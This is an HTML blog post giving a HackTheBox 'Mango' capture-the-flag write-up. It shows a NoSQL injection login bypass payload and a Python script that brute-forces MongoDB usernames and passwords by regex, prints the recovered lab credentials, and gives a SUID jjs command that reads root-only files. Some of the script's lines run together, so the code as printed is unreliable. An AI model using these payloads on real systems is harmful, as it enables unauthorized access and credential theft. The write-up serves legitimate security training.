@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/style.css">
+    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    
+    
+    <title>HackTheBox Mango Write Up | Ajdin&#39;s blog</title>
+</head>
+<body>
+        <main>
+            <div id="content">
+<br/>
+<h2>HackTheBox Mango Write Up</h2>
+
+
+
+<span class="date">2020-04-18</span>
+
+
+
+<br/>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Let’s run nmap,</p>
+<pre><code>sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
+</code></pre><p><img src="/htb/mango/nmap_initial_results.png" alt="nmap"></p>
+<p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
+<p><img src="/htb/mango/mango_search_page.png" alt="page"></p>
+<p><img src="/htb/mango/mango_analytics_page.png" alt="page"></p>
+<h2 id="getting-user-account">Getting user account</h2>
+<p>I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference:
+staging-order.mango.htb</p>
+<p><img src="/htb/mango/ssl_certificate.png" alt="ssl"></p>
+<p>The page is inaccessible, but we can use the /etc/hosts file to redirect the page back to the server itself. You could also change the headers of the https request and change the host value to “staging-order.mango.htb”.</p>
+<p>We have multiple server running on the same machine and port (Vhost - virtual hosts) so that is why when we change the host value, we access a “different” server.</p>
+<p>Now I added the line to /etc/hosts so the hostname is translated to the correct IP address.</p>
+<p><img src="/htb/mango/etc_hosts.png" alt="hosts"></p>
+<h3 id="nosql-injection">NoSQL injection</h3>
+<p>Now we have a login page here, I spent around 4 hours here as this wasn’t something I had experience with. We have to perform an authentication bypass.</p>
+<p><img src="/htb/mango/login_mongodb.png" alt="login"></p>
+<p>The login is handeld by MongoDB in the background. How do I know this? The full nmap scan has recognized a MongoDB instance. MondoDB is a NoSQL database, unlike PostgreSQL, which is an SQL database. We need to perform a NoSQL injection attack.</p>
+<p>I opened the network tab in Firefox and tried to login with “admin” and “test”. This will send a POST request. We can open it and see the request body.</p>
+<p><img src="/htb/mango/network_tab.png" alt="network"></p>
+<p><img src="/htb/mango/request.png" alt="request"></p>
+<p>Edit the request:</p>
+<p>Before:</p>
+<pre><code>username=admin&amp;password=test&amp;login=login
+</code></pre><p>After:</p>
+<pre><code>username=admin&amp;password[$ne]=test&amp;login=login
+</code></pre><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
+<p><img src="/htb/mango/request_reply.png" alt="reply"></p>
+<p><img src="/htb/mango/after_login.png" alt="afterlogin"></p>
+<h3 id="bruteforcing-the-password">Bruteforcing the password</h3>
+<p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
+<p>You should change the cookie ID.</p>
+<pre><code>import requests
+import stringurl = &quot;http://example.com&quot;
+headers = {&quot;Host&quot;: &quot;exmaple.com&quot;}
+cookies = {&quot;PHPSESSID&quot;: &quot;s3gcsgtqre05bah2vt6tibq8lsdfk&quot;}
+possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\&quot;+c for c in string.punctuation+string.whitespace ]def get_password(username):
+    print(&quot;Extracting password of &quot;+username)
+    params = {&quot;username&quot;:username, &quot;password[$regex]&quot;:&quot;&quot;, &quot;login&quot;: &quot;login&quot;}
+    password = &quot;^&quot;
+    while True:
+        for c in possible_chars:
+            params[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot;
+            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
+            if int(pr.status_code) == 302:
+                password += c
+                break
+        if c == possible_chars[-1]:
+            print(&quot;Found password &quot;+password[1:].replace(&quot;\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)
+            return password[1:].replace(&quot;\\&quot;, &quot;&quot;)def get_usernames():
+    usernames = []
+    params = {&quot;username[$regex]&quot;:&quot;&quot;, &quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;: &quot;login&quot;}
+    for c in possible_chars:
+        username = &quot;^&quot; + c
+        params[&quot;username[$regex]&quot;] = username + &quot;.*&quot;
+        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
+        if int(pr.status_code) == 302:
+            print(&quot;Found username starting with &quot;+c)
+            while True:
+                for c2 in possible_chars:
+                    params[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot;
+                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
+                        username += c2
+                        print(username)
+                        breakif c2 == possible_chars[-1]:
+                    print(&quot;Found username: &quot;+username[1:])
+                    usernames.append(username[1:])
+                    break
+    return usernamesfor u in get_usernames():
+    get_password(u)
+</code></pre><p>This will run for some time, the output is:</p>
+<p><img src="/htb/mango/password_bruteforce.png" alt="success"></p>
+<pre><code>admin:t9KcS3&gt;!0B#2
+mango:h3mXK8RhU~f{]f5H
+</code></pre><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
+<p><img src="/htb/mango/user_txt.png" alt="usertxt"></p>
+<h2 id="getting-root-account">Getting root account</h2>
+<p>First, I switch from sh to bash by running /bin/bash.</p>
+<p>I transfered linenum.sh on the server and checked the output. There was an interesting file with SUID bit set to 1:</p>
+<p><img src="/htb/mango/jjs.png" alt="jjs"></p>
+<h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS</h3>
+<p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
+<pre><code>echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;); var FileReader = Java.type(&quot;java.io.FileReader&quot;); var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;)); while ((line = br.readLine()) != null) { print(line); }' | jjs
+</code></pre><p><img src="/htb/mango/root_txt.png" alt="roottxt"></p>
+<p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>
+
+
+
+<div>
+    
+    
+    
+    
+    
+    </div>
+
+
+
+            </div>
+        </main>
+    </body>
+</html>
